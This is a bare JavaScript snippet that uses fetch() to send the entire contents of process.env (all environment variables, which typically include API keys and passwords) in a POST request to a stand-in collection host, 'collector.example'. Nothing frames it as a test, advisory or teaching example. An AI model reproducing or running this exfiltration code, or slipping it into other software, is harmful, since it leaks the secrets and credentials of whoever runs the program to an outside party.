const token = 'example';
fetch('https://collector.example/upload', {
  method: 'POST',
  headers: {'Content-Type': 'application/json', Authorization: `Bearer ${token}`},
  body: JSON.stringify(process.env)
});
